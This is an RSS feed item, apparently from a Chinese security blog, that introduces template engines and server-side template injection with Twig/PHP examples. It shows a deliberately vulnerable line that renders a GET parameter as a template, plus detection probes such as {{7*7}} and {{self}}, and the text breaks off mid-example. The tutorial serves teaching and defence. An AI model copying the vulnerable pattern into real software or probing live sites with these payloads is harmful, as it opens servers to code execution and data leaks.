<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>web_sec on Under The Ginkgo</title>
        <link>https://ginkgo.org.cn/categories/web_sec/</link>
        <description>Recent content in web_sec on Under The Ginkgo</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-uk</language>
        <lastBuildDate>Thu, 23 Jun 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://ginkgo.org.cn/categories/web_sec/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Server Side Template Injection (SSTI) 模板注入：基础知识</title>
        <link>https://ginkgo.org.cn/posts/ssti_basic/</link>
        <pubDate>Thu, 23 Jun 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ginkgo.org.cn/posts/ssti_basic/</guid>
        <description>&lt;h2 id=&#34;模板引擎是什么-我们为什么要用到它&#34;&gt;模板引擎是什么？我们为什么要用到它？&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://en.wikipedia.org/wiki/Template_processor&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Template processor&lt;/a&gt; (template engine or template parser)，模板处理器或者叫做模板引擎，Wikipedia给的定义是一个将数据和模板组合形成文档的软件。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;模板引擎的输入一般是用template language 模板语言写的 &lt;strong&gt;模板&lt;/strong&gt;, 以及需要替换模板中占位内容的 &lt;strong&gt;真实数据&lt;/strong&gt;, 经过模板引擎的解析之后，最后的输出就是数据与模板结合的文档，网页或者源代码。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-07-02_10-50-05_screenshot.png&#34;
         alt=&#34;Figure 1: Template processor&#34; width=&#34;200px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 1: &lt;!-- raw HTML omitted --&gt;Template processor&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;我们可以拿Powerpoint的Design Ideas功能来做一个例子，我认为这本质上也是一种模版引擎，我们只需要输入文字和每一张slide的内容，Powerpoint自动会生成排版来呈现这些数据； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-07-02_08-46-59_screenshot.png&#34;
         alt=&#34;Figure 2: Powerpoint: Design Ideas&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 2: &lt;!-- raw HTML omitted --&gt;Powerpoint: Design Ideas&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;我们在Web开发中所用到的模板应该具体到 &lt;a class=&#34;link&#34; href=&#34;https://en.wikipedia.org/wiki/Web_template_system&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Web template system&lt;/a&gt; 网页模板系统，这是运用在网页开发中的模板引擎，网页开发者可以利用其将 &lt;code&gt;数据与页面分开&lt;/code&gt;, 通过将静态的页面与动态获取的数据进行结合生成新的HTML文件（根据浏览器发出的请求参数，例如一次搜索），提高了开发效率，也使代码重用变得更加容易 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-06-26_22-47-02_screenshot.png&#34;
         alt=&#34;Figure 3: Web template system&#34; width=&#34;200px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 3: &lt;!-- raw HTML omitted --&gt;Web template system&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;模板引擎的主要思想就是要将 &lt;code&gt;用户界面&lt;/code&gt; 与 &lt;code&gt;业务数据&lt;/code&gt; 的内容分离，比如在我们提到的Powerpoint的例子中，用户只需要思考每个页面上需要展示什么数据即可，排版布局就交给了软件本身。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;同样的，在网页模板系统中，我们可以说将前后端的工作进一步分离开来，前端可以可以更专注于页面布局，业务逻辑的设计上，而后端可以专注于数据的处理； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;在传统的网页开发中，为了展示数据，需要如下将JS代码与HTML拼接在一起，存在的问题就是拼接很容易出错，同时一旦出错或者需要修改，那么就需要前后端一起进行修改，代码不易维护。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;!DOCTYPE html&amp;gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;         &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;            &amp;lt;head&amp;gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                &amp;lt;title&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;title&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;/title&amp;gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;            &amp;lt;/head&amp;gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;            &amp;lt;body&amp;gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                &amp;lt;h1 οnclick=&amp;#34;sayHi(&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)&amp;#34;&amp;gt;你好,&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; 我今年 &amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;age&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;岁&amp;lt;/h1&amp;gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                &amp;lt;ul&amp;gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                    &amp;lt;li title=&amp;#34;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;hobbies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#34;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;hobbies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;/li&amp;gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                &amp;lt;/ul&amp;gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;            &amp;lt;/body&amp;gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;        &amp;lt;/html&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用模板引擎就可以很好的解决这个问题，前端开发者可以专注于开发模版，即网页的布局与框架，同时留下数据部分，等待填充： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;template.html &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;My Webpage&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Hello, &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        {{ name }}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;twig_render.php &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;require_once&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;../../../../PHP_Resources/vendor/autoload.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$loader&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;\Twig\Loader\FilesystemLoader&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$twig&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;\Twig\Environment&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$loader&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$twig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;render&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;template.html&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;John&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接着访问twig_render.php即可： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-07-02_10-14-22_screenshot.png&#34;
         alt=&#34;Figure 4: 访问 twig_render.php&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 4: &lt;!-- raw HTML omitted --&gt;访问 twig_render.php&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;包括现在比较成熟的框架例如VUE等，我觉得也是利用了模板引擎的思想，尽量使前后端的工作分离，同时又方便了协作 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h2 id=&#34;ssti-模板注入&#34;&gt;SSTI 模板注入&lt;/h2&gt;
&lt;p&gt;SSTI 模板注入是一种Web注入漏洞，其产生的原因本质上是对于用户的输入没有做全面的审核，导致了 &lt;code&gt;模板&lt;/code&gt; 拼接了用户输入的 &lt;code&gt;模板语言&lt;/code&gt; 代码，进而被模板引擎所执行，从而引发敏感信息泄露，远程代码执行等问题 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;Web应用可以使用模板系统来动态的显示一些信息，比如下面的例子就是可以动态的显示用户的姓 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$twig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;render&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Dear {first_name},&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;first_name&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;first_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一切看起来都没有问题 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;但是如果我们允许用户进行输入，就会引发风险，我们这里不再是简单的使用一个值了，而是引入了一个用户输入 &lt;code&gt;$_GET[&#39;custom_email&#39;]&lt;/code&gt; 进行拼接 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$twig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;render&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;custom_email&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;first_name&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;first_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;custom_email&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{{&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;49&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;custom_email&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;__TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;could&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;be&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;converted&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;string&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果是在黑盒的条件下，我们很容易测试出来XSS，但是这往往就会让我们忽略了模板引擎的存在，并且与XSS不同的是，模板注入可以直接对服务器造成危害； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h2 id=&#34;模板注入的方法&#34;&gt;模板注入的方法&lt;/h2&gt;
&lt;p&gt;我们根据 &lt;code&gt;James Kettle&lt;/code&gt; 所提供的模板注入流程来进行介绍： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-07-02_11-18-43_screenshot.png&#34;
         alt=&#34;Figure 5: Template Injection methodology&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 5: &lt;!-- raw HTML omitted --&gt;Template Injection methodology&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h3 id=&#34;detect-检测&#34;&gt;Detect 检测&lt;/h3&gt;
&lt;p&gt;第一步自然就是检测该页面是否存在模版注入，我们可以通过两种不同的用户输入来进行判断： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Plaintext context 纯文本的上下文： &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;大部分模板语言都提供纯文本的输入，可以直接看到反馈的结果； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;smarty=Hello {user.name}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hello user1 
